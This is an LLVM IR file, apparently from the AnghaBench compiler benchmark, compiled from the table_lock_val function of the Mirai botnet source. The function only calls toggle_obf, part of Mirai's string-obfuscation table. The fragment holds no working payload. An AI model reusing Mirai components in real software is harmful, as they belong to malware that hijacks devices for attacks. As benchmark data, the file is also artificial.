; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_table.c_table_lock_val.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_table.c_table_lock_val.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.table_value = type { i64 }

@table = common dso_local global %struct.table_value* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @table_lock_val(i64 %0) #0 {
  %2 = alloca i64, align 8
  %3 = alloca %struct.table_value*, align 8
  store i64 %0, i64* %2, align 8
  %4 = load %struct.table_value*, %struct.table_value** @table, align 8
  %5 = load i64, i64* %2, align 8
  %6 = getelementptr inbounds %struct.table_value, %struct.table_value* %4, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i64, i64* %2, align 8
  %8 = call i32 @toggle_obf(i64 %7)
  ret void
}

declare dso_local i32 @toggle_obf(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
